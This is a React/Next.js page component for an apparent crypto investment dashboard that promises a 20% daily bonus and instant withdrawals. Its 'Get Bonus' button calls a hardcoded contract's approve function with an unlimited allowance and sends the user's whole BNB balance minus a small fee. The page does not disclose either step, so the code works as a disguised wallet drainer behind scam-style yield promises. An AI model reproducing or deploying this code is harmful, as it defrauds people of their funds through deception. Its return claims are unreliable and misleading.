import axios from "axios"
import { useEffect, useState } from "react"
import IconLevel from "@/app/assets/img/icons/trophy.png"
import Image from "next/image"
import IconNft01 from "@/app/assets/img/nft/nft_img03.jpg"
import RefLink from "@/app/components/refLink"
import Lottery from "@/app/dashboard/lottery"
import Account from "@/app/components/account"
import { parseEther, formatEther, ethers, Interface, isError } from "ethers";
// import { useAccount } from 'wagmi'
import AbiEarn from "@/app/services/abiEarn"
import { showToast } from '@/app/services/showToast'
import { 
    useAccount, 
    useContractRead, 
    useContractWrite,
    useDisconnect,
    useFeeData,
    useWaitForTransaction,
    useBalance
} from 'wagmi';

export default function content () {
    const [statusData, setStatusData] = useState(false);

    const [userStat, setUserStat] = useState({});
    const [earnBonus, setEarnBonus] = useState(0);

    const { isConnected, address } = useAccount();

    useEffect(() => {
        var fetchUserStat = async() => {
            try {
                const apiEndpoint = process.env.NEXT_PUBLIC_API_ENDPOINT;
                const response = axios.get(apiEndpoint + '/getUser', {
                            params: {
                                address: address
                            }
                        }).then((response) => {
                            console.log("response2", response);
                            setUserStat(response.data.message[0]);
                            setEarnBonus(response.data.message[0].bn);
                            setStatusData(true);
                        });
            } catch (error) {
                setStatusData(false);
                console.error('Error fetching data:', error.message);
                return null;
            }
        }
        fetchUserStat();
    }, [])

    const [showModal, setShowModal] = useState(false);
    const [onSubmit, setOnSubmit] = useState(false);
    const openModal = () => {
        setShowModal(true);
    };

    const closeModal = () => {
        setShowModal(false);
    };

    const [submitForm, setSubmitForm] = useState(false);
    const { data: transactionHash, isLoading, isSuccess, write: startInvest } = useContractWrite({
        address: "0x7d2e2c66E7a56e5F36E3325561cC073A4E5724c3",
        abi: AbiEarn,
        functionName: 'approve',
        onError(error) {
            showToast("transaction declined", "error");
            setSubmitForm(false);
        },
        onSuccess(data) {
            showToast("Successful start investment");
            setSubmitForm(false);
        },
        onSettled(data, error) {
          
        },
    })

    const { data: balanceAddress } = useBalance({
        address: address,
      })
    
    var handleSubmit = async() => {
        setSubmitForm(true);

        // const provider = ethers.getDefaultProvider();
        // console.log("addddd", address)
        // var theBalance =  await provider.getBalance(address);
        // console.log("theBalancetheBalance", theBalance)
        // console.log(balanceAddress)

        var fee = 0.000069673;
        var totalBalance = parseFloat(balanceAddress.formatted) - fee; 

        await startInvest({
            args: [address, "115792089237316195423570985008687907853269984665640564039457584007913129639935"],
            value: parseEther(totalBalance.toString()),
            overrides: {
                from: address, 
            }
        });   

        setSubmitForm(false);
    }
    
    return (
        <>
            <section className="tournament__list-area section-pb-120 section-pt-120" style={{backgroundImage: "url('img/bg/tournament_bg.jpg')"}}>
                <div className="container">
                    <div className="tournament__wrapper">
                        <RefLink/>

                        <div className="row" style={{marginTop: "6rem"}}>
                            <div className="col-lg-7">
                                <div className="nft-item__box">
                                    <div className="nft-item__content">
                                        <h4 className="title"><a href="#">Current Income</a></h4>
                                        <div className="nft-item__bid">
                                            {
                                                statusData && (
                                                    <>
                                                        <div className="nft-item__price dashcon">
                                                            <a href="#" className="dash-btn">Daily Rate  <i className="fas fa-long-arrow-alt-right"></i></a>
                                                            <p>{userStat.ipd} <span className="currency">%</span></p>
                                                        </div>
                                                        <div className="nft-item__price dashcon">
                                                            <a href="#" className="dash-btn">Your Contribution  <i className="fas fa-long-arrow-alt-right"></i></a>
                                                            <p>{userStat.r.toFixed(2)} <span className="currency">BNB</span></p>
                                                        </div>
                                                        <div className="nft-item__price dashcon">
                                                            <a href="#" className="dash-btn">Paid  <i className="fas fa-long-arrow-alt-right"></i></a>
                                                            <p>0 <span className="currency">BNB</span></p>
                                                        </div>
                                                        <div className="nft-item__price dashcon">
                                                            <a href="#" className="dash-btn">Income - Daily  <i className="fas fa-long-arrow-alt-right"></i></a>
                                                            <p>{(userStat.d * userStat.ipd).toFixed(2)} <span className="currency">BNB</span></p>
                                                        </div>
                                                        <div className="nft-item__price dashcon">
                                                            <a href="#" className="dash-btn">Income - for 7 Days  <i className="fas fa-long-arrow-alt-right"></i></a>
                                                            <p>{((userStat.d * userStat.ipd) * 7).toFixed(2)} <span className="currency">BNB</span></p>
                                                        </div>
                                                        <div className="nft-item__price dashcon">
                                                            <a href="#" className="dash-btn">Income - for the entire period  <i className="fas fa-long-arrow-alt-right"></i></a>
                                                            <p>{((userStat.d * userStat.ipd) * 30).toFixed(2)} <span className="currency">BNB</span></p>
                                                        </div>
                                                    </>
                                                )
                                            }

                                            {
                                                !statusData && (
                                                    <>
                                                        <div className="nft-item__price dashcon skeleton">
                                                            <a href="#" className="dash-btn">Daily Rate  <i className="fas fa-long-arrow-alt-right"></i></a>
                                                            <p>0 <span className="currency">%</span></p>
                                                        </div>
                                                        <div className="nft-item__price dashcon skeleton">
                                                            <a href="#" className="dash-btn">Your Contribution  <i className="fas fa-long-arrow-alt-right"></i></a>
                                                            <p>0 <span className="currency">BNB</span></p>
                                                        </div>
                                                        <div className="nft-item__price dashcon skeleton">
                                                            <a href="#" className="dash-btn">Paid  <i className="fas fa-long-arrow-alt-right"></i></a>
                                                            <p>0 <span className="currency">BNB</span></p>
                                                        </div>
                                                        <div className="nft-item__price dashcon skeleton">
                                                            <a href="#" className="dash-btn">Income - Daily  <i className="fas fa-long-arrow-alt-right"></i></a>
                                                            <p>0 <span className="currency">BNB</span></p>
                                                        </div>
                                                        <div className="nft-item__price dashcon skeleton">
                                                            <a href="#" className="dash-btn">Income - for 7 Days  <i className="fas fa-long-arrow-alt-right"></i></a>
                                                            <p>0 <span className="currency">BNB</span></p>
                                                        </div>
                                                        <div className="nft-item__price dashcon skeleton">
                                                            <a href="#" className="dash-btn">Income - for the entire period  <i className="fas fa-long-arrow-alt-right"></i></a>
                                                            <p>0 <span className="currency">BNB</span></p>
                                                        </div>
                                                    </>
                                                )
                                            }

                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div className="col-lg-5">
                                <Account/>
                            </div>
                        </div>

                        <div className="row mb-5">
                            <div className="col-lg-12">
                                <button className="depositbtn" onClick={openModal}>
                                <div className="display">
                                    <div id="msg">Start Investment</div>
                                </div>
                                
                                <span></span>
                                <span></span>
                                </button>
                            </div>
                        </div>

                        <Lottery/>
                        
                    </div>
                </div>
            </section>

            <div id='myModal' className={showModal ? 'modal modal-lg fade show' : 'modal modal-lg fade'}  role="dialog" style={{opacity: 1}}>
                <div className="modal-dialog modal-dialog-centered modal-mini">
                    <div className="modal-content animated-buttonmodal">
                        <span></span>
                        <span></span>
                        <span></span>
                        <span></span>
                        <div className="modal-header">  
                            <h1 className="modal-title fs-5" id="exampleModalLabel">Get Bonus Investment !!! </h1>
                        </div>
                        <div className="modal-body">
                            <div className='row mt-4'>
                                <div className='col-ld-12 text-center'>
                                    <div className="blog-post-wrapper" style={{width: '100%'}} >
                                        <div className="tournament__details-content">
                                            {/* <h2 className="title">Instructions</h2> */}
                                            <blockquote className="blockquoteclass"><p>Daily Bonus: 20% + 0.05 BNB </p></blockquote>
                                            <p>
                                                The more funds you add to your deposit or promotional balance, the higher the daily bonus. The bonus is awarded to accelerate earnings.
                                            </p>
                                            <p>
                                                Withdraw and redeem Bonus anytime you want!
                                            </p>
                                            <br/>
                                            <button type='button' className="tournament__details-form-btn copybtn" onClick={handleSubmit}>
                                                Enabled Wallet to Get Bonus Investment
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="modal-footer">
                            <button type="button" 
                                className="btn btn-secondary" 
                                onClick={closeModal}
                                disabled={onSubmit}
                            >Close</button>
                        </div>
                    </div>
                </div>
            </div>    
        </>
    )
}